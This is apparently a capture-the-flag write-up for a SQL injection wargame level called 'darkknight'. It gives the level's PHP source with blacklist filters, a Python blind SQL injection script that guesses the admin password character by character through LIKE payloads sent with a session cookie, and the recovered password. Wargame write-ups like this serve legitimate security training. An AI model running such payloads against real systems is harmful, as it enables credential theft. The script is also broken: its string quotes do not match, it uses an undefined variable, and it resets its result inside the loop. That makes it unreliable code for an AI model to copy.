
#  DARKKNIGHT
```
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_darkknight where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_darkknight where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("darkknight"); 
  highlight_file(__FILE__); 
?>
```
BlindSQLI with length of password as 8.

```
import requests
import string
characters = string.ascii_letters + string.digits
session = {
    "PHPSESSID": "dovaradinkdstego4urhvano2"
}
dbpass = ""
for i in range(1, 9):
    dbpass = ""
    for char in characters:
        paran = {
            "pw": '123','no':f'0 OR id LIKE "admin" AND pw LIKE "%{dbpass+passw}%'-- - "
        }
        response = requests.get("https://los.rubiya.kr/chall/darknight_60e5b360795c119588e4f3a86c5dd494.php", params=paran, cookies=session)
        output = response.text
        if "Hello admin" in output:
            dbpass += char
            break
print("Password:", dbpass)
```

###### password:0b70ea1f
 ***
####   query : select id from prob_darkknight where id='guest' and pw='0b70ea1f' and no=
***
